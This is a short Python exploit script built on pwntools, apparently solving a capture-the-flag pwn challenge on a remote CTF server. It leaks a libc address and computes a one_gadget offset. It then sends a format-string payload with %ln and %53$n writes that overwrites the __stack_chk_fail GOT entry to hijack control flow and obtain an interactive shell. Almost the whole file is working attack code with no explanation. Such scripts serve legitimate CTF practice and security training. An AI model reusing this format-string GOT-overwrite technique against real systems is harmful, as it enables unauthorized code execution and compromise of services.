from pwn import*
context.arch="amd64"
context.terminal="xterm" #adjust this with ur terminal
b="./main"
l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10013"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,""" b* vuln+ 203
        """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

p.recvuntil(b"secret code : ")
l.address = int(p.recvline()[:-1])-l.sym.puts
print(f"libc base : {hex(l.address)}")
one_gadget = l.address + 0xe5fb0
stack_chk_value = e.got.__stack_chk_fail -0x25
one_gadget_value = one_gadget - stack_chk_value - 0x25
payload=b"%p"*5 #padding in format string
payload+=b"%"+f"{stack_chk_value}".encode()+b"c"
payload+=b"%ln"
payload+=b"%"+f"{one_gadget_value&0xffffffff}".encode()+b"c"
payload+=b"%53$n"

p.sendline(payload)

p.interactive()
